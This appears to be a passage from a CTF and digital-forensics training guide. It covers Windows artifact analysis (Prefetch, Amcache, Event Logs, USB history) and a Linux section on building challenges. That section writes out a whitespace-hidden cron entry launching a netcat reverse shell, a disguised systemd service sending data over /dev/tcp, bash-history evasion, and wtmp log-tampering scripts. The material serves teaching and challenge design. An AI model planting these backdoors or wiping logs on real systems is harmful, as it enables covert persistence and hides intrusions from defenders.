- **LECmd (Eric Zimmerman):** The specialized utility for forensic parsing of LNK files, reliably extracting all relevant metadata fields, including timestamps and arguments.
    
- **Hex Editors (e.g., HxD):** Used to manually verify the location of data blocks (like the `Arguments` field) and inspect the raw 8-byte FILETIME timestamps for signs of stomping.
    
- **MFTECmd (Eric Zimmerman):** Used to extract and parse the **Master File Table (MFT)** from the disk image, providing the untampered filesystem timestamps for the LNK file itself, which are then compared against the LNK's internal times.

---

### Parsing Prefetch and Amcache to prove program execution

#### 1. Technical Theory

**Windows Prefetch (`.pf`):** Designed to speed up application startup, the Windows Cache Manager monitors the first 10 seconds of file execution and saves a trace of loaded resources to `C:\Windows\Prefetch`.

- **Naming Convention:** `FILENAME.EXE-HASH.pf`. The hash is derived from the file's path (and sometimes command-line arguments).
    
- **Evidence:** It stores the **Run Count** and the **Last execution timestamp** (Win10+ stores the last 8 timestamps).
    
- **Key Constraint:** Prefetch must be enabled in the registry (usually on by default for workstations, sometimes disabled on Servers or very old SSD configurations).
    

**Amcache (`Amcache.hve`):** A Windows Registry hive located at `C:\Windows\AppCompat\Programs\Amcache.hve`. It supports the Application Experience Service.

- **Evidence:** It tracks installed applications and executed binaries. Crucially, it records the **SHA-1 hash** of the binary. This is vital if the original malware file has been securely deleted (`sdelete`), as Amcache retains the hash needed to identify the malware family.
    
- **Key Constraint:** It is a registry hive (binary format), not a text log, requiring specific parsers to read keys like `InventoryApplication` and `InventoryApplicationFile`.
    

#### 2. Practical Implementation (The "How-To")

**Perspective: The Investigator (Solution)**

To solve this, you rarely analyze raw hex. You use parsers to convert binary artifacts into CSVs for filtering.

Step 1: Prefetch Analysis (Proving When and How Often)

Tools: PECmd (Eric Zimmerman).

1. **Ingest:** Locate the `.pf` file for the suspect binary (e.g., `RANSOM.EXE-12345678.pf`).
    
2. **Parse:** Use PECmd to extract metadata.
    
    PowerShell
    
    ```
    # Parse a single prefetch file
    # -f: File path
    # -q: Quiet mode (less noise)
    PECmd.exe -f "C:\Evidence\Prefetch\RANSOM.EXE-1A2B3C4D.pf" -q
    
    # Batch parse entire directory to CSV (Better for timelines)
    PECmd.exe -d "C:\Evidence\Prefetch" --csv "C:\Output" --csvf "prefetch_timeline.csv"
    ```
    
3. **Analysis:** Look for the "Run Count". If Run Count = 1, it was likely the initial dropper. If Run Count > 50, it's a frequently used tool.
    

Step 2: Amcache Analysis (Proving What - The Hash)

Tools: AmcacheParser (Eric Zimmerman).

1. **Ingest:** Locate `Amcache.hve` (usually extracted from `C:\Windows\AppCompat\Programs\`).
    
2. **Parse:**
    
    PowerShell
    
    ```
    # Parse the hive to CSVs
    # -f: Path to Amcache.hve
    # --csv: Output directory
    AmcacheParser.exe -f "C:\Evidence\Amcache.hve" --csv "C:\Output\Amcache"
    ```
    
3. **Analysis:** Open the generated `UnassociatedFileEntries.csv` or `InventoryApplicationFile.csv`.
    
4. **Filter:** Search for the executable name (e.g., `ransom.exe`).
    
5. **Result:** Copy the value in the `SHA1` column. Submit this to VirusTotal to identify the specific malware strain.
    

Step 3: Correlating (Python)

If you have CSV exports from both tools, you can use Python to link them by filename to build a stronger case.

Python

```
import pandas as pd

def correlate_artifacts(prefetch_csv, amcache_csv, suspect_binary):
    """
    Matches execution count (Prefetch) with File Hash (Amcache).
    """
    try:
        # Load datasets
        pf_df = pd.read_csv(prefetch_csv)
        am_df = pd.read_csv(amcache_csv)
        
        # Filter Prefetch
        # PECmd usually uses 'ExecutableName'
        pf_hit = pf_df[pf_df['ExecutableName'].str.contains(suspect_binary, case=False, na=False)]
        
        # Filter Amcache
        # AmcacheParser uses 'Name' or 'FileName' depending on the sub-CSV
        am_hit = am_df[am_df['Name'].str.contains(suspect_binary, case=False, na=False)]
        
        print(f"--- Analysis for {suspect_binary} ---")
        
        if not pf_hit.empty:
            print(f"[+] Prefetch: Executed {pf_hit.iloc[0]['RunCount']} times.")
            print(f"[+] Last Run: {pf_hit.iloc[0]['LastRun']}")
        else:
            print("[-] No Prefetch evidence found (File executed >10s ago or wiped).")
            
        if not am_hit.empty:
            print(f"[+] Amcache: SHA1 Hash found: {am_hit.iloc[0]['SHA1']}")
            print(f"[+] Amcache: Full Path: {am_hit.iloc[0]['LongPath']}")
        else:
            print("[-] No Amcache entry found.")
            
    except Exception as e:
        print(f"Error processing CSVs: {e}")

# Usage
# correlate_artifacts("prefetch_out.csv", "amcache_out.csv", "malware.exe")
```

#### 3. Example Scenario

Title: The Deleted Evidence

Scenario: An attacker gained access, ran a tool named wiper.exe, and then deleted the tool using sdelete. The investigator has the disk image but cannot recover the deleted wiper.exe binary file itself.

The Goal: Identify the malware hash to generate an IOC (Indicator of Compromise).

The Investigation:

1. Investigator parses `C:\Windows\Prefetch` and finds `WIPER.EXE-8B4A1C.pf`.
    
2. PECmd reveals `Run Count: 1` and `Last Run: 2023-11-21 04:00:00`. This confirms execution.
    
3. Investigator parses `Amcache.hve`.
    
4. Searching InventoryApplicationFile.csv for wiper.exe reveals a SHA-1 hash: a1b2c3d4....
    
    The Flag: CTF{a1b2c3d4...} (The retrieved hash).
    

#### 4. Key Tools

- **PECmd (Eric Zimmerman):** The industry standard for command-line parsing of Prefetch files.
    
- **AmcacheParser (Eric Zimmerman):** Specialized tool for flattening the complex Amcache registry hive into readable tables.
    
- **WinPrefetchView (NirSoft):** A GUI alternative for quick, non-programmatic inspection of Prefetch files on a live system or mounted image.

---

### Event Log correlation and filtering

#### 1. Technical Theory

Windows Event Logs (`.evtx`) utilize a binary XML format to store system activity. While individual events provide snapshots of time (e.g., "A process started"), **Correlation** is the forensic art of linking these isolated snapshots into a cohesive narrative using unique identifiers.

The primary keys for correlation are:

- **Logon ID (Hexadecimal):** A semi-unique session identifier generated upon authentication (Event ID 4624). This ID persists across subsequent events (like Process Creation 4688 or File Access 4663), effectively grouping all activity performed during that specific user session.
    
- **Process ID (PID):** Links a process start event to its subsequent network connections or child processes.
    
- **Time Window:** Events rarely happen simultaneously; they occur in sequences. Filtering by a tight time delta (e.g., +/- 2 seconds) is crucial for context.
    

**Key Constraints:** The `Logon ID` is unique only until a reboot, after which it resets. Furthermore, high-volume logs (Security) roll over quickly, potentially overwriting older evidence.

#### 2. Practical Implementation (The Investigator)

The goal is to filter out "noise" (system noise) and correlate "signal" (attacker activity) via PowerShell or specialized parsers.

Step 1: High-Speed Filtering with PowerShell

Use Get-WinEvent with FilterHashTable for performance. The following script finds a user logon and immediately correlates it with all processes spawned during that specific session.

PowerShell

```
# Define the target user and the Security log path
$TargetUser = "Administrator"
$LogPath = ".\Security.evtx"

# 1. Find the Logon Event (ID 4624) for the user
# LogonType 10 = RDP, 2 = Interactive, 3 = Network (SMB/Psexec)
$LogonEvents = Get-WinEvent -Path $LogPath -FilterHashTable @{id=4624} | 
               Where-Object {$_.Properties[5].Value -eq $TargetUser}

ForEach ($Logon in $LogonEvents) {
    # Extract the Logon ID (TargetLogonId is usually Property index 18 in newer OS, varies by version)
    # It is often displayed as hex (e.g., 0x1234abc) inside the XML
    $xml = [xml]$Logon.ToXml()
    $LogonId = $xml.Event.EventData.Data | Where-Object {$_.Name -eq "TargetLogonId"} | Select-Object -ExpandProperty "#text"
    
    Write-Host "[-] Found Logon: $TargetUser at $($Logon.TimeCreated) with ID: $LogonId" -ForegroundColor Cyan

    # 2. Correlate: Find Process Creation (ID 4688) with the MATCHING Logon ID
    # In 4688, SubjectLogonId identifies WHO started the process
    $Processes = Get-WinEvent -Path $LogPath -FilterHashTable @{id=4688} | 
                 Where-Object {
                    $procXml = [xml]$_.ToXml()
                    $subjectLogon = $procXml.Event.EventData.Data | Where-Object {$_.Name -eq "SubjectLogonId"} | Select-Object -ExpandProperty "#text"
                    return $subjectLogon -eq $LogonId
                 }
    
    ForEach ($Proc in $Processes) {
        $cmd = $Proc.Properties[5].Value # CommandLine
        Write-Host "    [+] Executed: $cmd" -ForegroundColor Yellow
    }
}
```

Step 2: Automated Threat Hunting (Chainsaw)

For CTFs with massive log sets, manual scripting is too slow. Use Chainsaw, which applies Sigma rules (pre-written detection logic) to EVTX files.

Bash

```
# Basic search for "Critical" severity alerts in all EVTX files in a folder
# This correlates patterns like "User Created" -> "Added to Admin Group" automatically
./chainsaw search ./evidence_logs/ --sigma ./sigma-rules/ --mapping mappings/sigma-event-logs-all.yml

# Filter specifically for RDP Logins (Event ID 4624, LogonType 10) and output to CSV
./chainsaw search ./evidence_logs/ -t "Event.System.EventID: =4624" -t "Event.EventData.LogonType: =10" --csv --output results.csv
```

Step 3: Timeline Analysis

Often the "Flag" is not in the event itself, but in the sequence.

1. Export logs to CSV using `EvtxECmd`.
    
2. Open in **Timeline Explorer**.
    
3. Group by `Event ID`.
    
4. Focus on the "46xx" series:
    
    - **4624:** Logon (Start of chain).
        
    - **4672:** Special Privileges Assigned (Did they get Admin?).
        
    - **4688:** Process Creation (What did they run?).
        
    - **4663/4660:** Object Access/Delete (Did they steal/delete the flag file?).
        

#### 3. Example Scenario

Challenge Name: "Ghost in the Shell"

Scenario: An attacker gained access to a workstation and exfiltrated a file. The only evidence is the Security.evtx.

The Artifact: A large EVTX file.

Analysis:

1. Filter for **EID 4624** (Logon). You notice a `LogonType 3` (Network Logon) from a suspicious IP at 14:00. The `TargetLogonId` is `0x4A2F`.
    
2. Filter for **EID 4688** (Process Creation) where `SubjectLogonId == 0x4A2F`.
    
3. You see `cmd.exe` launching `powershell.exe`.
    
4. Looking at the `CommandLine` field of the PowerShell event, you see a Base64 string.
    
5. Decoding the string reveals: `Get-Content C:\Secret\Flag.txt | Set-Content \\AttackerIP\Share\flag_stolen.txt`.
    
6. **The Flag:** The flag is derived from the timestamp of this specific 4688 event combined with the attacker's IP.
    

#### 4. Key Tools

1. **EvtxECmd (Eric Zimmerman):** The gold standard for parsing EVTX files into CSV/JSON formats. It standardizes the messy XML structure into readable columns for timeline analysis.
    
2. **Chainsaw / Hayabusa:** Rust-based, high-speed forensic tools that use Sigma rules to scan event logs for malicious patterns (like mimikatz execution or suspicious account creation) rather than just simple grep searching.
    
3. **Timeline Explorer:** A GUI-based CSV viewer optimized for forensics. It handles large datasets better than Excel and allows for regular expression filtering and column coloring to visualize the "Correlation" effectively.

---

### USB device history reconstruction

#### 1. Technical Theory

When a USB device is connected to a Windows system, the Plug and Play (PnP) manager initiates a driver installation process that leaves a permanent trail across multiple Registry hives and log files. This forensic trail persists even after the device is removed and can uniquely identify a specific physical device.

- **Device Identification:** Windows generates a **Device Instance ID** usually containing the Vendor ID (VID), Product ID (PID), and a **Serial Number**. If the device lacks a unique serial number, Windows generates a generic one (denoted by an `&` character in the ID), which is less forensically significant as it cannot uniquely identify a specific physical stick.
    
- **First vs. Last Connection:**
    
    - **First Connection:** Logged in `setupapi.dev.log` (text log) and the `USBSTOR` registry key creation time.
        
    - **Last Connection:** Updated in the registry key timestamp of the specific device entry.
        
- **Drive Letter Mapping:** The mapping between the unique device (Serial Number) and the logical volume (e.g., `E:`) is stored in `MountedDevices`.
    

**Key Constraints:** Windows updates the "Last Write" timestamp of the Registry key when the device is connected. However, simply removing the device does not always update this timestamp. Investigators typically rely on Event Logs (Event ID 2003/2004/2006 in newer Windows) for precise connection/disconnection windows.

#### 2. Practical Implementation (The "How-To")

The investigation follows a specific "waterfall" of registry keys to link a physical device to user activity.

Step 1: Identify Connected Devices (USBSTOR)

The primary artifact is located in the SYSTEM hive.

- **Path:** `SYSTEM\CurrentControlSet\Enum\USBSTOR`
    
- **Action:** Export this key or view it to list all USB storage devices ever connected.
    
- **Data Point:** The subkeys follow the format `Disk&Ven_Vendor&Prod_Product&Rev_Version`. Inside that is the **Serial Number**.
    

Step 2: Determine First Installation Time

To find when the device was first introduced to the system, check the SetupAPI log.

- **File:** `C:\Windows\INF\setupapi.dev.log`
    
- **Search:** Search for the Serial Number found in Step 1.
    
- **Result:** The log entry will show `Section start [date] [time]` marking the initial driver install.
    

Step 3: Correlate Device to Drive Letter

To know if the user accessed "Drive F:" or "Drive G:", you must link the device to a drive letter.

- **Path:** `SYSTEM\MountedDevices`
    
- **Action:** Look for values starting with `\DosDevices\`.
    
- **Analysis:** The data for `\DosDevices\F:` will match the binary data for `\??\Volume{GUID}`. This binary data contains the device's Parent ID Prefix (often derived from the Serial Number).
    

Step 4: User-Specific Interaction (MountPoints2)

To prove which user mounted the device (in a multi-user system), check the user's specific registry hive.

- **Path:** `NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2`
    
- **Significance:** If the GUID/Device entry exists here, the specific user associated with this `NTUSER.DAT` was logged in when the device was connected.
    

Automated Parsing Script (Python):

While tools are preferred, this script demonstrates parsing the raw USBSTOR logic.

Python

```
import winreg

def list_usb_history():
    path = r"SYSTEM\CurrentControlSet\Enum\USBSTOR"
    # Note: This requires running as Admin on a live system 
    # or loading an offline hive to HKLM.
    
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
        info = winreg.QueryInfoKey(key)
        
        print(f"{'Vendor/Product':<40} | {'Serial Number':<30}")
        print("-" * 75)
        
        for i in range(info[0]):
            device_name = winreg.EnumKey(key, i)
            device_key = winreg.OpenKey(key, device_name)
            
            # Subkeys of the device are usually the Serial Numbers
            device_info = winreg.QueryInfoKey(device_key)
            for j in range(device_info[0]):
                serial = winreg.EnumKey(device_key, j)
                print(f"{device_name:<40} | {serial:<30}")
                
    except FileNotFoundError:
        print("USBSTOR key not found. Ensure you are admin or checking correct hive.")

# On a live analysis machine:
# list_usb_history()
```

#### 3. Example Scenario

Scenario Title: "The Exfiltrated Prototype"

Context: A manufacturing company found their prototype blueprints on a competitor's blog. The suspect is an engineer, "User_A". A USB drive (SanDisk Cruzer, Serial: 200512345) was found in their bag.

Analysis Steps:

1. **Registry Check:** The investigator loads the `SYSTEM` hive from the engineer's laptop.
    
2. **Identification:** They locate `USBSTOR\Disk&Ven_SanDisk&Prod_Cruzer...` and find the subkey `200512345`. This proves the specific stick found in the bag was connected to the laptop.
    
3. **Timestamping:** The `Last Write` time of that Registry key is `2023-10-15 14:30:00`.
    
4. **Drive Letter:** Checking `MountedDevices`, they match the serial `200512345` to `\DosDevices\E:`.
    
5. File Access: Using User_A's NTUSER.DAT, they check RecentDocs. They find E:\Blueprints\Prototype_V2.pdf.lnk created at 2023-10-15 14:32:00.
    
    Conclusion: The USB drive was plugged in at 14:30, assigned letter E:, and the specific blueprint file was accessed from it at 14:32, confirming the theft.
    

#### 4. Key Tools

- **Registry Explorer (Eric Zimmerman):** The gold standard for loading offline registry hives (`SYSTEM`, `SOFTWARE`, `NTUSER.DAT`) and parsing USB history automatically.
    
- **USBDeview (NirSoft):** A portable tool for live analysis that lists all currently and previously connected USB devices with friendly timestamps and serials.
    
- **RegRipper:** A CLI tool with specific plugins (`usbstor`, `mountdev`) to extract this data into text reports rapidly.

# Module 7: Operating System Artifacts (Linux/Unix)

## The Architect (Creation)

### Creating malicious Cron jobs or Systemd services

#### 1. Technical Theory

Persistence is a phase in the cyber kill chain where an adversary maintains access to a system across restarts or user logouts. In Linux environments, this is most commonly achieved by abusing the Task Scheduler (**Cron**) or the Init System (**Systemd**).

- **Cron:** A daemon that executes commands at specific intervals. Malicious entries can be hidden in user crontabs (`/var/spool/cron/crontabs/`) or system-wide directories (`/etc/cron.d/`, `/etc/cron.daily/`).
    
- **Systemd:** The modern initialization system for Linux distributions. It uses "Unit Files" (`.service`) to define processes that start at boot. Attackers create malicious services or "Timers" (which act like cron jobs) to execute payloads.
    
- **Key Constraint:** Persistence artifacts must be owned by root (or the specific user) and have the correct execution permissions, otherwise the daemon will fail to load them.
    

#### 2. Practical Implementation (The "How-To")

**Perspective: The Architect (Creation)**

A. Cron Obfuscation (The "Space" Technique)

A common CTF trick is to place a malicious command in a crontab but pad it with enough whitespace that a casual cat or inspection of the file appears empty or benign.

Bash

```
# 1. Create a payload script
echo "nc -e /bin/bash 10.0.0.1 4444" > /tmp/.sys-check
chmod +x /tmp/.sys-check

# 2. Create a malicious cron entry in /etc/cron.d/
# This file looks like a comment or empty line due to carriage returns or spaces
# Note: We use 100 spaces before the command.
echo -e "# System Update Check\n* * * * * root                                                                                                    /tmp/.sys-check" > /etc/cron.d/system-update

# 3. Verification
# When the user types 'cat /etc/cron.d/system-update', they might miss the command on the far right.
```

B. Creating a Malicious Systemd Service

This method mimics legitimate services. We will create a service that looks like a generic "Network Wait" service but actually exfiltrates data.

1. Create the Unit File:
    
    Location: /etc/systemd/system/network-wait-online.service.d/ (Overriding existing) or a new file /etc/systemd/system/sys-monitor.service.
    
    Bash
    
    ```
    sudo nano /etc/systemd/system/sys-monitor.service
    ```
    
    **Content:**
    
    Ini, TOML
    
    ```
    [Unit]
    Description=System Integrity Monitor
    After=network.target
    
    [Service]
    Type=simple
    User=root
    # The payload: A simple loop that sends the flag to a remote port every 60s
    ExecStart=/bin/bash -c "while true; do echo 'FLAG{p3rs1st3nc3_is_k3y}' > /dev/tcp/127.0.0.1/1337; sleep 60; done"
    Restart=always
    
    [Install]
    WantedBy=multi-user.target
    ```
    
2. **Enable and Start:**
    
    Bash
    
    ```
    sudo systemctl daemon-reload
    sudo systemctl enable sys-monitor.service
    sudo systemctl start sys-monitor.service
    ```
    

C. Systemd Timers (Decoupled Execution)

For a harder challenge, separate the trigger from the execution. The investigator might find the service but wonder why it's not enabled (WantedBy is missing). It's because a Timer activates it.

1. **The Service (`/etc/systemd/system/backup.service`):**
    
    Ini, TOML
    
    ```
    [Service]
    Type=oneshot
    ExecStart=/usr/bin/python3 /opt/hidden_script.py
    ```
    
2. **The Timer (`/etc/systemd/system/backup.timer`):**
    
    Ini, TOML
    
    ```
    [Unit]
    Description=Run backup every 5 minutes
    
    [Timer]
    OnBootSec=2min
    OnUnitActiveSec=5min
    Unit=backup.service
    
    [Install]
    WantedBy=timers.target
    ```
    
3. **Activation:**
    
    Bash
    
    ```
    sudo systemctl enable --now backup.timer
    ```
    

#### 3. Example Scenario

Scenario: "The Phantom Reboot"

Challenge: Users are given a VM credential. They are told the system communicates with a C2 server immediately upon reboot, but checking ps aux shows nothing suspicious initially.

Architecture:

1. The Architect uses a **Systemd Path Unit** (`/etc/systemd/system/monitor.path`).
    
2. This unit monitors a specific file (e.g., `/tmp/trigger`).
    
3. When the Architect (or a startup script) touches /tmp/trigger, the Path Unit activates monitor.service, which executes the payload.
    
    The Solve: The investigator must use systemctl list-units --type=path or inspect the dependency tree (systemd-analyze verify) to realize that file system events, not just time, can trigger artifacts.
    

#### 4. Key Tools

- **`crontab`:** Used to manipulate user-specific schedule tables.
    
- **`systemctl`:** The primary command for interacting with the Systemd manager (start, stop, enable, list-timers).
    
- **`cat` / `nano`:** For creating the text-based unit files.
    
- **`systemd-analyze`:** Useful for verifying unit file syntax and dependencies during creation.

---

### Obfuscating Bash history (ignoring space-prefixed commands)

#### 1. Technical Theory

Bash maintains a history of commands executed by the user, typically stored in `~/.bash_history`. The behavior of this logging is controlled by environment variables, most notably `HISTCONTROL`.

- **`HISTCONTROL=ignorespace`**: Instructs Bash **not** to log any command that begins with a leading space character (e.g., `cat /etc/shadow`).
    
- **`HISTCONTROL=ignoreboth`**: Combines `ignorespace` and `ignoredups` (ignoring duplicate consecutive commands).
    
- **The Artifact:** When an attacker uses this technique, the `.bash_history` file will show a contiguous list of commands, but critical steps (like downloading malware or exfiltrating data) will be completely absent.
    

A forensic anomaly often appears if the attacker sets this variable _during_ the session: the command `export HISTCONTROL=ignorespace` will appear in the history, followed immediately by an illogical sequence of events (e.g., downloading a tool and then immediately exiting, without ever running the tool), implying the intermediate steps were hidden.

#### 2. Practical Implementation (The "How-To")

**Perspective: The Architect (Creation)**

To create a CTF challenge based on this artifact, you must manufacture a `.bash_history` file that tells a story of a compromise while deliberately omitting the "smoking gun" commands.

You can generate this artifact manually using a Python script to ensure precise control over the timestamps (if `HISTTIMEFORMAT` is simulated) and the command sequence.

Method: Python Script to Generate Artifact

This script creates a .bash_history file simulating an attacker who enables obfuscation, runs hidden commands, and then slips up or leaves a trace.

Python

```
import time

def create_compromised_history(filename="evidence_bash_history"):
    # The syntax for .bash_history with timestamps is:
    # #<unix_timestamp>
    # command
    
    base_time = int(time.time()) - 10000
    
    # Narrative:
    # 1. Attacker recons the system (Logged)
    # 2. Attacker enables ignorespace (Logged)
    # 3. Attacker runs hidden exploit (NOT Logged - represented by time gap)
    # 4. Attacker checks success (Logged)
    
    history_entries = [
        (base_time + 10, "whoami"),
        (base_time + 20, "uname -a"),
        (base_time + 30, "sudo -l"),
        (base_time + 45, "export HISTCONTROL=ignorespace"), # The "Tell"
        # --- HIDDEN ACTIVITY HAPPENS HERE (e.g., downloading payload) ---
        # We simulate a time gap of 5 minutes to suggest hidden manual work
        (base_time + 345, "ls -la /tmp/payload_dropped"), # Clue left behind
        (base_time + 350, "rm /tmp/payload_dropped"),
        (base_time + 360, "exit")
    ]
    
    try:
        with open(filename, "w") as f:
            for timestamp, command in history_entries:
                # Write timestamp line
                f.write(f"#{timestamp}\n")
                # Write command line
                f.write(f"{command}\n")
        
        print(f"[+] Artifact created: {filename}")
        print("[+] Timestamps included. Use 'history' with HISTTIMEFORMAT to view.")
        
    except IOError as e:
        print(f"[-] Error writing file: {e}")

if __name__ == "__main__":
    create_compromised_history()
```

**To verify the artifact as a student would see it:**

Bash

```
# Set the format to readable dates
export HISTTIMEFORMAT="%F %T "
# Read the generated file into the current session's history for viewing
history -r evidence_bash_history
history
```

#### 3. Example Scenario

Scenario Name: "The Silent Operator"

Narrative: A server was compromised, but the logs seem strangely sparse. The attacker gained root access, but the command to elevate privileges is missing from the history.

The Artifact: A .bash_history file containing:

1. `whoami`
    
2. `export HISTCONTROL=ignorespace`
    
3. `ls /root/flag.txt`
    
4. exit
    
    The Puzzle: How did they get from whoami (user) to listing /root?
    
    The Solution: The student notices the export command. They realize the attacker typed sudo -s (with a leading space) or similar to elevate privileges without logging it. The flag might be the reconstruction of the timeline or identifying the specific obfuscation technique used.
    

#### 4. Key Tools

- **`history`:** The built-in Bash command to view and manipulate the history list.
    
- **`cat` / `strings`:** Essential for viewing the raw `.bash_history` file, especially if it's from a different user or system.
    
- **Text Editor (Nano/Vim/Python):** Used by the Architect to manually inject or delete lines from history files to craft the narrative.

---

### Log tampering (clearing utmp, wtmp, btmp)

#### 1. Technical Theory

Linux systems track user sessions using three specific binary log files, typically found in `/var/log/` or `/var/run/`. Unlike standard ASCII logs (e.g., `syslog`), these are composed of fixed-length binary structures (C `struct utmp`).

- **utmp:** Tracks _currently_ logged-in users.
    
- **wtmp:** Stores the history of all logins and logouts.
    
- **btmp:** Records failed login attempts.
    

Because these are binary files, simply opening them in a text editor displays garbage and saving them destroys the file structure. To tamper with them for a CTF (e.g., hiding a login or inserting a flag), one must manipulate the binary data directly or convert the binary structure to text, modify it, and convert it back.

#### 2. Practical Implementation (The "How-To")

Perspective: The Architect

To create a challenge where logs are tampered with (but not destroyed), or to hide a flag inside the binary metadata of these logs.

A. The "Surgical" Method (Using utmpdump)

This is the cleanest way to modify logs without corrupting the binary headers. You dump to text, edit, and restore.

1. Export Binary to Text:
    
    Dump the contents of wtmp to a readable format.
    
    Bash
    
    ```
    # -r implies reverse (binary to text)
    utmpdump /var/log/wtmp > wtmp_editable.txt
    ```
    
2. Inject the Flag:
    
    Open wtmp_editable.txt in any text editor (nano, vim). Locate a specific entry (e.g., a reboot or a root login) and replace the username or hostname field with your flag.
    
    - _Original:_ `[7] [1234] [ts/0] [root] [pts/0] [192.168.1.50] [2025-11-21 10:00:00]`
        
    - _Modified:_ `[7] [1234] [ts/0] [flag{wtmp_ghost}] [pts/0] [192.168.1.50] [2025-11-21 10:00:00]`
        
3. Restore Text to Binary:
    
    Overwrite the original binary file with your tampered version.
    
    Bash
    
    ```
    # -r implies restore (text to binary)
    utmpdump -r < wtmp_editable.txt > /var/log/wtmp
    
    # Verify the file looks "normal" (binary) but contains the data
    strings /var/log/wtmp | grep "flag"
    ```
    

B. The "wiper" Method (Selective Deletion via Python)

Use Python to perform binary surgery—removing specific records to simulate an attacker covering their tracks, or overwriting a specific record with NULL bytes.

Python

```
import struct

# Define the path to the log file
LOG_PATH = "/var/log/wtmp"
# Size of a standard utmp entry on x86_64 is usually 384 bytes
# Warning: This varies by architecture. Check sizeof(struct utmp).
ENTRY_SIZE = 384 

def tamper_log():
    with open(LOG_PATH, "r+b") as f:
        # Read the entire file
        data = f.read()
        
        # Calculate number of entries
        num_entries = len(data) // ENTRY_SIZE
        print(f"Found {num_entries} entries.")

        # Scenario: Overwrite the last entry (attacker logout) with the flag
        # We seek to the start of the last entry
        f.seek((num_entries - 1) * ENTRY_SIZE)
        
        # Create a fake binary blob (padding with nulls)
        # This is a simplistic corruption for the challenge
        flag = b"flag{null_byT3_inject10n}"
        padding = b"\x00" * (ENTRY_SIZE - len(flag))
        f.write(flag + padding)
        
        print("Tampering complete.")

if __name__ == "__main__":
    tamper_log()
```

C. Timestomping

You can confuse investigators by altering the timestamps within the wtmp file to make the login appear to have happened in 1970 or in the future.

1. Use the `utmpdump` method above.
    
2. Edit the timestamp field in the text file: `[2038-01-19 03:14:07]`.
    
3. Restore the file.
    

#### 3. Example Scenario

Scenario: "The Time Traveler"

An attacker gained access to the server, but they were sloppy. They tried to delete their login record from /var/log/wtmp.

- **The Setup:** You created a `wtmp` file where one specific entry corresponding to the attacker's IP `10.0.0.1337` has been partially overwritten.
    
- **The Twist:** Instead of deleting the entry, the attacker replaced the timestamp field with the flag in hexadecimal format, or replaced the "terminal" identifier with the flag string.
    
- **The Artifact:** When the investigator runs `last -f wtmp`, they see a corrupted line or a weird username. When they run `strings`, they see `flag{b4d_acc0unt1ng}`.
    

#### 4. Key Tools

- **utmpdump:** The primary tool for converting `utmp`/`wtmp` files between binary and text formats.
    
- **Hex Editor (e.g., GHex, 010 Editor):** Essential for manually verifying the binary structure and ensuring checksums or padding are correct if manually editing.
    
- **dd:** Useful for truncating files (e.g., deleting the last 384 bytes to remove the logout record).

---

### Hiding files using dot-notation or deep directory nesting

#### 1. Technical Theory

In Linux/Unix-like operating systems, file visibility is primarily controlled by naming conventions rather than file attributes (unlike Windows "Hidden" attribute).

- **Dot-Notation:** By default, standard shell commands like `ls` and GUI file managers do not display files or directories beginning with a period (`.`). This convention, originally a quirk of early filesystem code, is now the standard for configuration files (e.g., `.bashrc`).
    
- **Path Obfuscation:** Deep directory nesting leverages "security by obscurity" and analyst fatigue. It places artifacts so deep within a directory tree (often exceeding 20+ levels) that manual traversal is impractical, and automated searches might be skipped if the investigator configures depth limits to save time.
    

#### 2. Practical Implementation (The Architect)

These techniques are best used to hide flags in "plain sight" or to force investigators to use recursive search tools (`find`, `grep -r`) rather than manual browsing.

A. The "Dot" Method (Basic Hiding)

This creates a file that vanishes from a standard ls output but appears with ls -a.

Bash

```
# 1. Create a hidden directory (looks like a system config folder)
mkdir .cache_backup

# 2. Create a hidden file inside it
echo "flag{hidden_in_plain_sight}" > .cache_backup/.config_sys

# 3. (Optional) Use spaces/invisible characters to make it harder to type
# This creates a directory named ". " (dot space)
mkdir ". "
mv .cache_backup ". "
```

B. The "Abyss" Script (Deep Nesting Automation)

Creating 50+ layers of directories manually is tedious. Use Python to generate a recursive structure and plant the flag at the bottom. This forces the user to use command-line traversal tools.

Python

```
import os

def create_abyss(depth=100, base_path="./abyss"):
    """
    Creates a directory structure 100 folders deep.
    """
    current_path = base_path
    
    # 1. Create the deep structure
    for i in range(depth):
        # We name folders iteratively (0, 1, 2...) to simulate a log or data structure
        next_folder = os.path.join(current_path, str(i))
        os.makedirs(next_folder, exist_ok=True)
        current_path = next_folder

    # 2. Plant the flag at the very bottom
    flag_path = os.path.join(current_path, "flag.txt")
    with open(flag_path, "w") as f:
        f.write("flag{recursion_is_tiring_without_find}")
        
    print(f"[+] Abyss created. Depth: {depth}")
    print(f"[+] Flag location: {flag_path}")

if __name__ == "__main__":
    create_abyss()
```

C. The "Camouflage" Technique

Hide the nested structure inside valid system paths where deep nesting is expected, making it blend in.

Bash

```
# Mimic a python virtual environment or node_modules structure
mkdir -p project/node_modules/lodash/deps/lib/timers/.hidden/
echo "flag{fake_dependency}" > project/node_modules/lodash/deps/lib/timers/.hidden/package-lock.json
```

#### 3. Example Scenario

**Scenario: The "Endless Log" Challenge**

- **The Setup:** The user is provided with a disk image containing a user home directory. The hint suggests the user "hid their secrets in their logs."
    
- **The Artifact:** A folder named `.sys_logs` exists in the home directory. Inside, there is a directory `0`, containing `1`, containing `2`, and so on, for 200 levels.
    
- **The Twist:** The flag isn't just at the bottom. At level 50, there is a hidden file `.backup` alongside directory `51`. If the user just scripts a "cd" loop to the bottom, they miss the file in the middle.
    
- **The Solution:** The user must use `find . -name "flag*"` or `grep -r "flag{"` to bypass the structural noise.
    

#### 4. Key Tools

- **`mkdir` & `touch`:** The fundamental tools for creating directories and files.
    
- **Python/Bash:** Essential for scripting the creation of high-volume or high-depth directory structures.
    
- **`tree`:** Useful for the architect to visualize and verify the structure created before finalizing the challenge.


## The Investigator (Solution)

### Analyzing .bash_history and .viminfo

#### 1. Technical Theory

User activity logs are primary sources for reconstructing an actor's steps.

- **`.bash_history`:** A simple text file located in a user's home directory (`~/.bash_history`). It records the commands executed in the terminal. However, it is not a perfect audit log: it is typically only written to disk when a shell session closes, and lines starting with a space may be omitted depending on `HISTCONTROL`.
    
- **`.viminfo`:** A metadata file generated by the Vim text editor. It is significantly more granular than bash history. It stores:
    
    - **Command Line History:** Commands entered with `:` (e.g., `:wq`, `:s/old/new`).
        
    - **Search String History:** Strings searched with `/`.
        
